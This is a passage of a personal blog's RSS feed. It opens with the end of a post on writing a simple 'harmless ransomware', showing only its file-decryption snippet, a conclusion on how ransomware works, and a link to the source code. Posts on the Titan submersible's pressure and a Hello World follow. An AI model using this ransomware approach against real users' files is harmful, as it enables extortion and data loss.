</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">with</span> open(file, <span style="color:#e6db74">&#34;wb&#34;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>		f<span style="color:#f92672">.</span>write(content_decrypted)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Files decrypted!&#34;</span>)
</span></span></code></pre></div><p>And after running this, we can read the content of our files.</p>
<p><img src="/img/harmless-ransomware/file1-decrypted.png" alt="file1-decrypted"></p>
<p>We can also see our image files.</p>
<p><img src="/img/harmless-ransomware/pic-decrypted.png" alt="pic-decrypted"></p>
<hr>
<h2 id="the-conclusion">The conclusion</h2>
<p>So there we have it, an encryption and decryption program that makes up a ransomware. Of course, this is a very simple and rather harmless ransomware. In fact, if someone is a bit tech savvy, they won&rsquo;t have much trouble decrypting the files.</p>
<p>But what&rsquo;s at this ransomware&rsquo;s core is also what&rsquo;s at any other ransomware&rsquo;s core, the ability to find and encrypt all the files on the computer and the ability to decrypt them later on.</p>
<p>This is the basic principle that every ransomware operates on.</p>
<blockquote>
<p>You can find the source code for this project <a href="https://github.com/namberino/simple-ransomware">here</a>.</p></blockquote>
]]></content>
        </item>
        
        <item>
            <title>The pressure of OceanGate&#39;s Titan</title>
            <link>https://namberino.github.io/posts/2024/02/the-pressure-of-oceangates-titan/</link>
            <pubDate>Mon, 19 Feb 2024 12:27:06 +0700</pubDate>
            
            <guid>https://namberino.github.io/posts/2024/02/the-pressure-of-oceangates-titan/</guid>
            <description>&lt;p&gt;I was bored so I went down the rabbit hole of engineering disasters. One disaster that caught my eyes was the &lt;em&gt;OceanGate&amp;rsquo;s Titan incident&lt;/em&gt;. It caught my eyes because I was curious about how much pressure was applied onto the submarine at that depth, so I grab my calculator and got to work.&lt;/p&gt;
&lt;p&gt;The most dangerous thing about deep ocean is probably the hydrostatic pressure. This pressure is proportional to the depth measured from the surface of the water body. The weight of the body of fluid gradually increases.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<p>I was bored so I went down the rabbit hole of engineering disasters. One disaster that caught my eyes was the <em>OceanGate&rsquo;s Titan incident</em>. It caught my eyes because I was curious about how much pressure was applied onto the submarine at that depth, so I grab my calculator and got to work.</p>
<p>The most dangerous thing about deep ocean is probably the hydrostatic pressure. This pressure is proportional to the depth measured from the surface of the water body. The weight of the body of fluid gradually increases.</p>
<p>This hydrostatic pressure is calculated with the following formula (assuming the pressure is measured over a <em>$1m^2$</em> liquid block):</p>
<p>$$
P = \rho g h
$$</p>
<p>Where:</p>
<p><em>$P$</em>: Pressure of the liquid ($N/m^2$)</p>
<p><em>$\rho$</em>: Density of the liquid ($kg/m^3$)</p>
<p><em>$g$</em>: Acceleration due to gravity ($9.8 m/s^2$)</p>
<p><em>$h$</em>: The height of the liquid column</p>

    <img src="/img/oceangate/pressure.png"  alt="pressure diagram"  class="center"  style="padding: 10px"  />


<p>First, we can calculate the pressure that a normal human may experience on the surface and then multiply it with the depth of the OceanGate&rsquo;s Titan.</p>
<p>We already know some variable:</p>
<ul>
<li>The pressure ($P$) that we usually experience is $1atm$ or $100,000 N/m^2$</li>
<li>The density of water is $1,000 kg/m^3$</li>
<li>$g$ is $9.8 m/s^2$ but we&rsquo;ll round it up to $10 m/s^2$</li>
</ul>
<p>So we can calculate that:</p>
<p>$$
\frac{100,000 N/m^2}{1,000 kg/m^3 \cdot 10 m/s^2} = 10m
$$</p>
<p>So the pressure increases by $1atm$ for every $10m$ of depth we go down. And since OceanGate&rsquo;s Titan was around $4,000m$ deep when it imploded, we can calculate that:</p>
<p>$$
\frac{4,000m}{10m} = 400atm
$$</p>
<p>So the OceanGate&rsquo;s Titan was experiencing around $400atm$ of pressure when it imploded. Over <strong>400</strong> times what we normally experience.</p>
<p>It&rsquo;s a bit hard to put $400atm$ into perspective. So for reference, here&rsquo;s a video of a can exploding under only $1atm$ of pressure:</p>
<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/atsgIvOUFhA?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"></iframe>
    </div>

]]></content>
        </item>
        
        <item>
            <title>Hello World!</title>
            <link>https://namberino.github.io/posts/2024/01/hello-world/</link>
            <pubDate>Sat, 27 Jan 2024 16:11:34 +0700</pubDate>
            
            <guid>https://namberino.github.io/posts/2024/01/hello-world/</guid>
            <description>&lt;p&gt;This is the first post on this website.&lt;/p&gt;
&lt;p&gt;The next posts will be about various different topics, such as science, engineering, maybe even some random topics that crosses my mind that I find interesting&lt;/p&gt;
&lt;p&gt;For now, here&amp;rsquo;s a picture of a cute dog:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://namberino.github.io/img/hello-world/dogo1.jpg&#34; alt=&#34;Cute dogo&#34;&gt;&lt;/p&gt;</description>
            <content type="html"><![CDATA[<p>This is the first post on this website.</p>
<p>The next posts will be about various different topics, such as science, engineering, maybe even some random topics that crosses my mind that I find interesting</p>
<p>For now, here&rsquo;s a picture of a cute dog:</p>
<p><img src="/img/hello-world/dogo1.jpg" alt="Cute dogo"></p>
]]></content>
        </item>
        
    </channel>
</rss>
